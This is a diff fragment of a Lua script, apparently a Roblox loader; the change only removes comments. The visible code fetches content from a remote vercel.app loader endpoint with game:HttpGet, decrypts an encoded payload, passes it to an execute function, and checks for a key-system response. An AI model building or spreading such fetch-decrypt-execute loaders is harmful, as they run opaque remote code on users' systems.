@@ -26,7 +26,6 @@ local function decrypt_payload(encoded_str)
     return table.concat(decrypted)
 end
 
--- The URL passed in from the dashboard
 local URL_BASE = "https://lua-axon.vercel.app/api/loader/YOUR_SLUG_HERE"
 
 local function execute_payload(data)
@@ -39,12 +38,10 @@ local function execute_payload(data)
     end
 end
 
--- 1. Try to fetch without a key
 local success, response = pcall(function()
     return game:HttpGet(URL_BASE, true)
 end)
 
--- 2. Check if the server demands a key
 if success and string.find(response, "Key required") then
     
     local ScreenGui = Instance.new("ScreenGui")
